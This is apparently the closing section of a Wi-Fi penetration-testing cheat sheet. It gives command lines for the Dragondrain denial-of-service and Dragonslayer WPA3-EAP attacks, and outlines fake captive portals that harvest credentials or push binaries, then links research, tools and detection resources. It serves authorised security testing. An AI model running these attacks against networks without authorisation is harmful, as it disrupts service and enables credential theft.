<h4 id="denial-of-service-against-wpa3-sae">Denial of Service against WPA3-SAE</h4>
<p>Test to which extend an Access Point is vulnerable to denial-of-service attacks against WPA3's SAE handshake. The Dragondrain tool forges Commit messages to cause a high CPU usage on the target.<br />
- https://github.com/vanhoefm/dragondrain-and-time </p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>./dragondrain -d wlan0 -a 01:02:03:04:05:06
</span></code></pre></div>
<h4 id="wpa3-eap-invalid-curve-attack">WPA3-EAP - Invalid curve attack</h4>
<ul>
<li>https://github.com/vanhoefm/dragonslayer</li>
</ul>
<p>dragonslayer/client.conf
<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>network={
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>    ssid=&quot;WPA3Corpo&quot;
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>    identity=&quot;jdoe&quot;
</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>
</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>    key_mgmt=WPA-EAP
</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a>    eap=PWD
</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a>    password=&quot;unknown password&quot;
</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a>}
</span></code></pre></div></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a> sudo ./dragonslayer-client.sh -i wlp2s0 -a 1
</span></code></pre></div>
<p>#### WPA3-EAP - Reflection attack
 - https://github.com/vanhoefm/dragonslayer</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>sudo ./dragonslayer-client.sh -i wlp2s0 -a 0
</span></code></pre></div>
<h2 id="wpa3-enterprise">WPA3-Enterprise</h2>
<ul>
<li>https://mrncciew.com/2020/08/17/wpa3-enterprise/</li>
</ul>
<p>AKM Value defined in the IEEE-802.11 REVmd ( Revision of 802.11-2016 standard which is going to be 802.11-2020). Note that AKM 8 &amp; 9 used with SAE (WPA3- Personal use AKM 8), AKM 1,3,5,11 (WPA3-Enterprise only or WPA3-Enterprise transition), AKM 12,13 (WPA3-Enterprise 192-bit) &amp; AKM 18 for Enhanced Open (OWE).<br />
<img alt="alt text" src="image.png" /></p>
<h1 id="wi-fi-hacking-mind-map">Wi-Fi Hacking Mind Map</h1>
<ul>
<li><a href="https://raw.githubusercontent.com/koutto/pi-pwnbox-rogueap/main/mindmap/WiFi-Hacking-MindMap-v1.png">Link to the map</a>
<img src="/images/wifi_mindmap.png" width="700"/></li>
</ul>
<h1 id="other-attacks">Other Attacks</h1>
<h3 id="fake-captive-portal">Fake Captive Portal</h3>
<ul>
<li>Asking connected client for AD or any sensitive credentials </li>
<li>You could also redirect the user to download some binary</li>
</ul>
<h3 id="fake-open-access-point">Fake Open Access Point</h3>
<p>The main goal is to create an interesting enough SSID in order for a victim to connect (e.g. SSID: Company-FreeSnacks).  </p>
<ul>
<li>Monitor connection from clients</li>
<li>Directly attacked clients</li>
<li>MITM their traffic</li>
</ul>
<h1 id="to-be-checked-validated-during-an-engagement">To be checked - Validated during an engagement</h1>
<h3 id="general">General</h3>
<ul>
<li>Check for the presence of rogue or undocumented Access Point</li>
</ul>
<h3 id="open-authentication_1">Open Authentication</h3>
<ul>
<li>Captive portal bypass</li>
<li>DNS tunneling</li>
<li>Passive Sniffing</li>
<li>Evil Twin (MITM, Captive Portal (phishing), Hostile portal attack, OWE Transition downgrade)</li>
<li>Client isolation</li>
<li>Network segmentation</li>
<li>AD Authentication on Guest Portal</li>
<li>Self-Signed Certificate on Guest Portal</li>
<li>Azure AD Conditional Access Policy</li>
<li>Active Directory Authentication on Guest Portal</li>
</ul>
<h3 id="personal-authentication_1">Personal Authentication</h3>
<ul>
<li>WEP attacks</li>
<li>WPS Pin attacks</li>
<li>PMKID attack</li>
<li>4 way handshake sniffing</li>
<li>Deauthentication attack</li>
<li>KRACK Attack</li>
<li>FRAG Attack</li>
<li>WPA3-Transition Downgrade attack</li>
<li>WPA3-SAE timing or cache based password partitioning attacks</li>
</ul>
<h3 id="enterprise">Enterprise</h3>
<ul>
<li>Evil twin attack / Fake AP</li>
<li>Password Spray</li>
<li>Absence of Identity Privacy</li>
</ul>
<h1 id="resources">Resources</h1>
<h4 id="wpa3-dragonfly">WPA3 - DragonFly</h4>
<ul>
<li>https://sarwiki.informatik.hu-berlin.de/WPA3_Dragonfly_Handshake#:~:text=The%20major%20improvement%20of%20WPA3,traffic%20after%20a%20key%20breach.</li>
<li>https://sarwiki.informatik.hu-berlin.de/WPA3_Dragonfly_Handshake#:~:text=The%20major%20improvement%20of%20WPA3,traffic%20after%20a%20key%20breach.</li>
</ul>
<h4 id="dragonblood-analyzing-the-dragonfly-handshake-of-wpa3-and-eap-pwd">Dragonblood: Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd</h4>
<ul>
<li>https://papers.mathyvanhoef.com/dragonblood.pdf</li>
</ul>
<h4 id="wep-cloaking">WEP Cloaking</h4>
<ul>
<li>https://media.defcon.org/DEF%20CON%2015/DEF%20CON%2015%20presentations/DEF%20CON%2015%20-%20gupta_and_ramachandran-WP.pdf</li>
</ul>
<h4 id="4-way-handshake">4-Way Handshake</h4>
<ul>
<li>https://www.wifi-professionals.com/2019/01/4-way-handshake</li>
</ul>
<h4 id="ptk-derivation">PTK Derivation</h4>
<ul>
<li>https://crypto.stackexchange.com/questions/47003/how-pairwise-transient-key-is-derived-or-generated</li>
<li>https://en.wikipedia.org/wiki/Pseudorandom_function_family</li>
<li>https://dalewifisec.wordpress.com/tag/ptk/</li>
</ul>
<h4 id="pi-pwnbox-rogue-ap">Pi-PwnBox Rogue AP</h4>
<ul>
<li>https://github.com/koutto/pi-pwnbox-rogueap</li>
</ul>
<h4 id="openwrt-supported-devices">OpenWRT supported devices</h4>
<ul>
<li>https://openwrt.org/toh/views/toh_extended_all</li>
</ul>
<h4 id="openwrt-compatibles-routers">OpenWRT Compatibles routers</h4>
<ul>
<li>https://openwrt.org/toh/start</li>
</ul>
<h4 id="ssid-oracle-attack-on-undisclosed-wi-fi-preferred-network-lists">SSID Oracle Attack on Undisclosed Wi-Fi Preferred Network Lists</h4>
<ul>
<li>https://www.hindawi.com/journals/wcmc/2018/5153265/</li>
</ul>
<h4 id="wep-attack-fragmentation-chopchop">WEP attack fragmentation - chopchop</h4>
<ul>
<li>https://github.com/DominikStyp/WEP-attack</li>
</ul>
<h4 id="wifi-security-history-of-insecurities-in-wep-wpa-and-wpa2">WiFi security: history of insecurities in WEP, WPA and WPA2</h4>
<ul>
<li>https://security.blogoverflow.com/2013/08/wifi-security-history-of-insecurities-in-wep-wpa-and-wpa2/</li>
</ul>
<h1 id="tools">Tools</h1>
<ul>
<li>https://github.com/derv82/wifite2</li>
<li>https://github.com/sensepost/berate_ap</li>
<li>https://github.com/vanhoefm/krackattacks-poc-zerokey</li>
<li>https://github.com/ZerBea/hcxtools</li>
<li>https://github.com/sensepost/hostapd-mana</li>
<li>https://github.com/sensepost/ppp_sycophant</li>
<li>https://github.com/sensepost/wpa_sycophant</li>
<li>https://github.com/s0lst1c3/eaphammer</li>
<li>https://github.com/vanhoefm/dragonslayer</li>
<li>https://github.com/vanhoefm/dragondrain-and-time</li>
<li>https://github.com/vanhoefm/dragonforce</li>
<li>https://github.com/vanhoefm/fragattacks</li>
<li>https://github.com/vanhoefm/krackattacks-scripts</li>
</ul>
<h1 id="defenses">Defenses</h1>
<ul>
<li>https://github.com/SYWorks/waidps</li>
<li>http://syworks.blogspot.com/2014/04/waidps-wireless-auditing-intrusion.html</li>
</ul>
<h4 id="karma-attack-detection">KARMA Attack detection</h4>
<ul>
<li>https://github.com/AlexLynd/WiFi-Pineapple-Detector</li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Subnet-Guide.xlsx" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Subnet-Guide.xlsx" class="btn btn-xs btn-link">
        Subnet-Guide
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../../malware/files/XSS_Attacks.zip" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../../malware/files/XSS_Attacks.zip" class="btn btn-xs btn-link">
        XSS_Attacks
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/network/wifi/wifi-pentest.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>